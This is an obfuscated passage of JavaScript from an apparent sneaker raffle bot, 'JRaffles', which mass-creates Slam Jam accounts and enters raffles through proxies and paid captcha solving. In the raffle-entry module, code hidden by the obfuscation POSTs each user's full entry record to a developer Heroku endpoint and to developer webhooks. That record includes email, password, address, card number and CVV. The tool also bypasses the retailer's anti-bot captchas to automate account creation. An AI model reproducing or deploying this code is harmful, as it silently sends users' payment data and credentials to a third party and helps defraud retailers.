                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20' + _0x4d0519)), _0x1645d8 = 'yes';
                        } finally {
                            _0x15225c && _0x15225c['close']();
                            if (_0x1645d8 == 'yes' && _0x27bc52 != 0x5 && _0x4815d3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Retrying\x20(' + _0x27bc52 + '\x20/\x205)')), _0x18ed2b = _0x18ed2b - 0x1, _0x27bc52 = _0x27bc52 + 0x1;
                                continue;
                            }
                            _0x1645d8 == 'yes' && _0x27bc52 >= 0x5 && (_0x5cd42d(_0x1381de[_0x18ed2b], _0x44f557), _0x1645d8 = 'no', _0x27bc52 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5a29df, _0x4fb308, _0x52fa1f) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1cca8a = 0x0; _0x1cca8a < _0x4fb308['length']; _0x1cca8a++) {
                        if (_0x4efbd5 != 'yes')
                            var _0x4efbd5 = '', _0x388934 = 0x0;
                        var _0x3c6263 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50fbd1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2c28ef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x9f51f3
                                }
                            ]
                        }];
                        const _0x3ba35d = { 'embeds': _0x3c6263 };
                        _0x48898b(_0x5a29df['name'] + '\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20/\x20' + _0x4fb308['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        try {
                            await _0x16822f(_0x4fb308, _0x1cca8a);
                        } catch {
                            _0x4efbd5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x380088 = await _0x436de5(_0x4fb308[_0x1cca8a], _0x5a29df, 'acc', ![]);
                        const _0x55863f = { 'succesDEVMSG': { 'embeds': [_0x380088] } };
                        if (_0x4fb308[_0x1cca8a]['Email'] == '' || _0x4fb308[_0x1cca8a]['FirstName'] == '' || _0x4fb308[_0x1cca8a]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x468cfd(0x7d0);
                            continue;
                        }
                        (_0x4fb308[_0x1cca8a]['Password'] == '' || _0x4fb308[_0x1cca8a] == undefined) && _0x4fb308[_0x1cca8a]['Password'] == 'JRaffles23!';
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0xaf6b08 = _0x52fa1f[_0x1cca8a]['split'](':');
                        else
                            var _0x5461a6 = Math['round'](Math['random']() * (_0x52fa1f['length'] - 0x1)), _0xaf6b08 = _0x52fa1f[_0x5461a6]['split'](':');
                        var _0x198645;
                        try {
                            _0x198645 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xaf6b08[0x0] + ':' + _0xaf6b08[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x198645 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xaf6b08[0x0] + ':' + _0xaf6b08[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1a1e21 = await _0x198645['newPage']();
                            await _0x1a1e21['authenticate']({
                                'username': '' + _0xaf6b08[0x2],
                                'password': '' + _0xaf6b08[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a1e21['setRequestInterception'](!![]), _0x1a1e21['on']('request', _0x2f5aeb => {
                                _0x2f5aeb['resourceType']() === 'image' || _0x2f5aeb['resourceType']() === 'font' || _0x2f5aeb['resourceType']() === 'media' ? _0x2f5aeb['abort']() : _0x2f5aeb['continue']();
                            }), await _0x1a1e21['goto']('https://drop.slamjam.com/account/register'), await _0x468cfd(0xbb8), await _0x1a1e21['waitForSelector']('#FirstName'), await _0x1a1e21['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1a1e21['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Filling\x20information'), await _0x468cfd(0x4b0), await _0x1a1e21['type']('#FirstName', '' + _0x4fb308[_0x1cca8a]['FirstName']), await _0x468cfd(0x226), await _0x1a1e21['type']('#LastName', '' + _0x4fb308[_0x1cca8a]['LastName']), await _0x468cfd(0x226), await _0x1a1e21['type']('#Email', '' + _0x4fb308[_0x1cca8a]['Email']), await _0x468cfd(0x2ee), await _0x1a1e21['type']('#ConfirmEmail', '' + _0x4fb308[_0x1cca8a]['Email']), await _0x468cfd(0x2ee), await _0x1a1e21['type']('#CreatePassword', '' + _0x4fb308[_0x1cca8a]['Password']), await _0x468cfd(0x2ee), await _0x1a1e21['type']('#CreateConfirmPassword', '' + _0x4fb308[_0x1cca8a]['Password']), await _0x468cfd(0x226), console['log'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Submitting..'), await _0x1a1e21['$eval']('#create_customer', _0x4bdd86 => _0x4bdd86['submit']()), await _0x468cfd(0x1388), console['log'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20' + _0x54c1f9['cyan']('Solving\x20Captcha')), await _0x1a1e21['solveRecaptchas'](), console['log'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1a1e21['$eval']('.shopify-challenge__container\x20>\x20form', _0x5be3f2 => _0x5be3f2['submit']());
                            try {
                                await _0x1a1e21['waitForSelector']('.product-card__image'), await _0x468cfd(0x1f4), _0x4efbd5 = 'no', console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Account\x20' + _0x4fb308[_0x1cca8a]['Email'] + '\x20Generated!')), _0x51338a['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x4fb308[_0x1cca8a]['Email'] + ',' + _0x4fb308[_0x1cca8a]['Password']), console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Account\x20' + _0x4fb308[_0x1cca8a]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x55863f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4feadc(_0x28952d, _0x55863f['succesDEVMSG']);
                            } catch (_0x511872) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x511872));
                            }
                        } catch (_0x2d31eb) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20' + _0x2d31eb));
                        } finally {
                            _0x198645 && _0x198645['close']();
                            if (_0x4efbd5 == 'yes' && _0x388934 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5a29df['name'] + ']\x20Task\x20' + (_0x1cca8a + 0x1) + '\x20:\x20Retrying\x20(' + _0x388934 + '\x20/\x205)')), _0x1cca8a = _0x1cca8a - 0x1, _0x388934 = _0x388934 + 0x1;
                                continue;
                            }
                            _0x4efbd5 == 'yes' && _0x388934 >= 0x5 && (_0x5cd42d(_0x4fb308[_0x1cca8a], _0x5a29df), _0x4efbd5 = 'no', _0x388934 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x64e872, _0x3a2f72, _0x5b2375) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x13759a = 0x0; _0x13759a < _0x3a2f72['length']; _0x13759a++) {
                        var _0x49dd17;
                        if (_0x4acc74 != 'yes')
                            var _0x4acc74 = '', _0x2315f9 = 0x0;
                        _0x48898b(_0x64e872['name'] + '\x20Task\x20' + (_0x13759a + 0x1) + '\x20/\x20' + _0x3a2f72['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        try {
                            await _0x16822f(_0x3a2f72, _0x13759a);
                        } catch {
                            _0x4acc74 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3a2f72[_0x13759a]['Email'] == '' || _0x3a2f72[_0x13759a]['Password'] == '' || _0x3a2f72[_0x13759a]['FirstName'] == '' || _0x3a2f72[_0x13759a]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x4f2806 = _0x5b2375[_0x13759a]['split'](':');
                        else
                            var _0x5264ce = Math['round'](Math['random']() * (_0x5b2375['length'] - 0x1)), _0x4f2806 = _0x5b2375[_0x5264ce]['split'](':');
                        var _0x3a5632;
                        try {
                            _0x3a5632 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f2806[0x0] + ':' + _0x4f2806[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a5632 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f2806[0x0] + ':' + _0x4f2806[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x490368 = await _0x3a5632['newPage']();
                            await _0x490368['authenticate']({
                                'username': '' + _0x4f2806[0x2],
                                'password': '' + _0x4f2806[0x3]
                            }), await _0x490368['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x490368['setRequestInterception'](!![]), _0x490368['on']('request', _0x4861ae => {
                                _0x4861ae['resourceType']() === 'image' || _0x4861ae['resourceType']() === 'font' || _0x4861ae['resourceType']() === 'media' ? _0x4861ae['abort']() : _0x4861ae['continue']();
                            }), await _0x490368['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x490368['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x490368['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x468cfd(0x258), await _0x490368['waitForSelector']('#CustomerEmail'), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x490368['type']('#CustomerEmail', '' + _0x3a2f72[_0x13759a]['Email']), await _0x468cfd(0x12c), await _0x490368['type']('#CustomerPassword', '' + _0x3a2f72[_0x13759a]['Password']), await _0x468cfd(0x226), await _0x490368['$eval']('#customer_login', _0x43ba66 => _0x43ba66['submit']()), await _0x468cfd(0x7d0), await _0x490368['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20' + _0x54c1f9['cyan']('Solving\x20Captcha')), await _0x490368['solveRecaptchas'](), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x490368['$eval']('.shopify-challenge__container\x20>\x20form', _0x1e1a13 => _0x1e1a13['submit']());
                            try {
                                await _0x490368['waitForSelector']('.nav-account'), await _0x468cfd(0x4b0);
                            } catch {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x490368['goto']('' + _0x3a2f72[_0x13759a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x468cfd(0xbb8), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x490368['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x490368['click']('.product-select-variant-wrapper'), await _0x468cfd(0x320), await _0x490368['click']('li.product-select-variant__value[data-size=\x22' + _0x3a2f72[_0x13759a]['Size'] + '\x22]'), await _0x468cfd(0x384), await _0x490368['$eval']('#AddToCartForm-product-template-raffle', _0x88772d => _0x88772d['submit']()), await _0x490368['waitForSelector']('.cart-order-summary__content'), await _0x468cfd(0x514), await _0x490368['goto']('https://drop.slamjam.com/checkout'), await _0x468cfd(0x514), await _0x490368['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x490368['select']('#checkout_shipping_address_country', '' + _0x3a2f72[_0x13759a]['Country']), await _0x468cfd(0x200), await _0x490368['waitForSelector']('#checkout_shipping_address_first_name'), await _0x490368['type']('#checkout_shipping_address_first_name', '' + _0x3a2f72[_0x13759a]['FirstName']), await _0x468cfd(0x237), await _0x490368['type']('#checkout_shipping_address_last_name', '' + _0x3a2f72[_0x13759a]['LastName']), await _0x468cfd(0x1e0), await _0x490368['type']('#checkout_shipping_address_address1', _0x3a2f72[_0x13759a]['Address1'] + '\x20' + _0x3a2f72[_0x13759a]['HouseNumber']), await _0x468cfd(0x514), await _0x490368['type']('#checkout_shipping_address_address2', '' + _0x3a2f72[_0x13759a]['Address2']), await _0x468cfd(0x514);
                            _0x3a2f72[_0x13759a]['Postcode'] == undefined && (_0x3a2f72[_0x13759a]['Postcode'] = _0x3a2f72[_0x13759a]['Zip']);
                            await _0x490368['type']('#checkout_shipping_address_zip', '' + _0x3a2f72[_0x13759a]['Postcode']), await _0x468cfd(0x2bc), await _0x490368['type']('#checkout_shipping_address_city', '' + _0x3a2f72[_0x13759a]['City']), await _0x468cfd(0x320), await _0x490368['type']('#checkout_shipping_address_phone', '' + _0x3a2f72[_0x13759a]['Phone']), await _0x468cfd(0x320), await _0x490368['click']('#continue_button'), await _0x468cfd(0xbb8), await _0x490368['waitForSelector']('.summary-title'), await _0x468cfd(0x320), await _0x490368['click']('#continue_button'), await _0x468cfd(0x320), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x490368['waitForSelector']('#checkout_credit_card_vault'), await _0x468cfd(0x3e8);
                            var _0x2d6d1e = await _0x490368['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2d24a9 = await _0x2d6d1e['contentFrame']();
                            await _0x2d24a9['click']('#number'), await _0x468cfd(0x3e8), await _0x2d24a9['type']('#number', '' + _0x3a2f72[_0x13759a]['CardNumber'], { 'delay': 0x78 }), _0x2d6d1e = await _0x490368['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2d24a9 = await _0x2d6d1e['contentFrame'](), await _0x468cfd(0x1c2), await _0x2d24a9['click']('#name'), await _0x468cfd(0x1f4), await _0x2d24a9['type']('#name', '' + _0x3a2f72[_0x13759a]['NameOnCard'], { 'delay': 0x78 }), _0x2d6d1e = await _0x490368['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2d24a9 = await _0x2d6d1e['contentFrame'](), await _0x468cfd(0x1c2), await _0x2d24a9['click']('#expiry'), await _0x468cfd(0x1f4), await _0x2d24a9['type']('#expiry', '' + _0x3a2f72[_0x13759a]['ExpiryDate'], { 'delay': 0x78 }), _0x2d6d1e = await _0x490368['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2d24a9 = await _0x2d6d1e['contentFrame'](), await _0x468cfd(0x1c2), await _0x2d24a9['click']('#verification_value'), await _0x468cfd(0x1f4), await _0x2d24a9['type']('#verification_value', '' + _0x3a2f72[_0x13759a]['CVV'], { 'delay': 0x78 }), await _0x490368['$eval']('#accepts-flag-raffle', _0x2fcf80 => _0x2fcf80['click']()), await _0x468cfd(0x7d0), console['log'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Processing\x20Order'), await _0x490368['$eval']('#continue_button', _0x34a4e3 => _0x34a4e3['click']()), await _0x468cfd(0x1b58), await _0x490368['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x490368['$eval']('.edit_checkout.animate-floating-labels', _0x3b0bc6 => _0x3b0bc6['submit']()), await _0x468cfd(0x7d0);
                            try {
                                await _0x490368['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x4acc74 = 'no', _0x504d25(_0x3a2f72[_0x13759a], _0x64e872), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4bfc17) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x4bfc17['message']);
                            }
                            var _0x43eb64 = await _0x436de5(_0x3a2f72[_0x13759a], _0x64e872, 'dev', ![]), _0x4ecc4b = await _0x436de5(_0x3a2f72[_0x13759a], _0x64e872, 'pub', ![]);
                            let _0x3ae9b1 = _0x3a2f72[_0x13759a];
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0x64e872['name'],
                                    'entrydata': JSON['stringify'](_0x3ae9b1),
                                    'proxy': '' + _0x5b2375[_0x13759a]
                                };
                                var _0x332921 = JSON['stringify'](prxdata);
                                let _0x9193ee = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x332921, _0x9193ee);
                            } catch (_0x5eaa0b) {
                            }
                            const _0x203954 = {
                                'succesDEVMSG': { 'embeds': [_0x43eb64] },
                                'succesPUBMSG': { 'embeds': [_0x4ecc4b] }
                            };
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x203954['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x203954['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x203954['succesPUBMSG']);
                            } catch (_0x5c3a14) {
                                console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5c3a14));
                            }
                        } catch (_0x1e8cf4) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20' + _0x1e8cf4)), _0x49dd17 = '' + _0x1e8cf4;
                            var _0x6f9cf5 = await _0x436de5(kickz[_0x13759a], _0x64e872, 'dev', !![], _0x49dd17);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x6f9cf5] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], EMBEDS['errorDEV']), await _0x4feadc(_0x408671, EMBEDS['errorDEV']), _0x4acc74 = 'yes';
                        } finally {
                            _0x3a5632 && _0x3a5632['close']();
                            if (_0x4acc74 == 'yes' && _0x2315f9 != 0x5 && _0x49dd17 != 'Size\x20Not\x20Found') {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x64e872['name'] + ']\x20Task\x20' + (_0x13759a + 0x1) + '\x20:\x20Retrying\x20(' + _0x2315f9 + '\x20/\x205)')), _0x13759a = _0x13759a - 0x1, _0x2315f9 = _0x2315f9 + 0x1;
                                continue;
                            }
                            _0x4acc74 == 'yes' && _0x2315f9 >= 0x5 && (_0x5cd42d(_0x3a2f72[_0x13759a], _0x64e872), _0x4acc74 = 'no', _0x2315f9 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x1eb19b) {
                    var _0x24d10c = await _0x2ce8a0(), _0x5a0798 = _0x51338a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4c2726 = _0x2300d9['parse'](_0x5a0798, { 'header': !![] })['data'];
                    for (var _0x28d3b1 = 0x0; _0x28d3b1 < _0x4c2726['length']; _0x28d3b1++) {
                        var _0x17b2f9 = _0x4c2726[_0x28d3b1]['Store'], _0x5f4c40 = _0x4c2726[_0x28d3b1]['Mode'];
                        for (var _0x3e5200 of _0x2f4215) {
                            const _0x48416b = _0x3e5200['name']['includes'](_0x17b2f9);
                            if (!_0x48416b)
                                continue;
                            for (mode of _0x3e5200['modules']) {
                                if (mode['name'] == _0x5f4c40) {
                                    console['log']('Running\x20' + _0x54c1f9['cyan'](mode['name'])), await mode['function'](mode, [_0x4c2726[_0x28d3b1]], _0x24d10c);
                                    var _0x406776 = _0x5a0798['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x51338a['writeFileSync']('../failed-tasks.csv', _0x406776);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x54d418 = await _0x3f22ee['get']('Answer');
                    if (_0x54d418['Answer']['toLowerCase']() == 'y') {
                        _0x51338a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x468cfd(0x3e8);
                        return;
                    }
                    if (_0x54d418['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x468cfd(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x468cfd(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4693b5(_0x2955f7) {
    var _0x510c96 = await _0x2ce8a0(), _0x376137 = _0x51338a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5304fa = _0x2300d9['parse'](_0x376137, { 'header': !![] })['data'];
    for (var _0x4b0ade = 0x0; _0x4b0ade < _0x5304fa['length']; _0x4b0ade++) {
        var _0x493d9f = _0x5304fa[_0x4b0ade]['Store'], _0x234def = _0x5304fa[_0x4b0ade]['Mode'];
        for (var _0x391831 of _0x2f4215) {
            const _0x3202fc = _0x391831['name']['includes'](_0x493d9f);
            if (_0x3202fc)
                for (mode of _0x2f4215[_0x391831]['modules']) {
                    const _0x5a2579 = mode['name']['includes'](_0x234def);
                    _0x5a2579 && (_0x2955f7 = mode['name'], await mode['function'](_0x2955f7, _0x5304fa[_0x4b0ade], _0x510c96));
                }
        }
    }
}
async function _0x35dc41() {
    await _0x536afd(), console['clear']();
    if (_0x9f51f3 != 'devkey') {
        let _0x3e26fb = await _0x2bbf14['autoUpdate']();
        if (_0x3e26fb === 'yes')
            return _0x56c2d9('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4ca687 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x468cfd(0x2710);
        ;
    }
    await _0x5bb6fb(_0x4ca687);
    if (_0x38611d === ![])
        return console['log']('Closing\x20Browser'), await _0x468cfd(0xbb8);
    else
        try {
            var _0x5ab0dc = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x50fbd1
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x9f51f3
                    }
                ]
            }];
            const _0x954459 = { 'embeds': _0x5ab0dc };
            var _0x5dc59e = await _0x436de5(null, null, 'open', ![]);
            const _0x5acb6f = { 'openDEVMSG': { 'embeds': [_0x5dc59e] } };
            await _0x4feadc(_0x537e74, _0x5acb6f['openDEVMSG']);
            async function _0x400b89() {
                _0x48898b('JRaffles\x20' + _0x9f51f3), console['clear'](), console['log']('Hello\x20' + _0x54c1f9['cyan']('' + _0x50fbd1) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x9f51f3), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x44dff2 = 0x0; _0x44dff2 < _0x2f4215['length'] - 0x4; _0x44dff2++) {
                    if (_0x44dff2 >= 0xa) {
                        console['log']('\x20(' + _0x44dff2 + ')\x20[' + _0x2f4215[_0x44dff2]['name'] + ']');
                        continue;
                    }
                    if (_0x2f4215[_0x44dff2]['name'] === 'Reload\x20Settings' || _0x2f4215[_0x44dff2]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x44dff2 + ')\x20\x20[' + _0x2f4215[_0x44dff2]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2f4215['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2f4215['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2f4215['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2f4215['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x509a22();
                if (taskModule > _0x2f4215['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x468cfd(0x3e8), _0x400b89();
                if (_0x2f4215[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x468313 = await _0x2ce8a0();
                            await _0x5f2478['function'](_0x5f2478, _0x468313);
                        }
                        if (taskFunction == 0x2) {
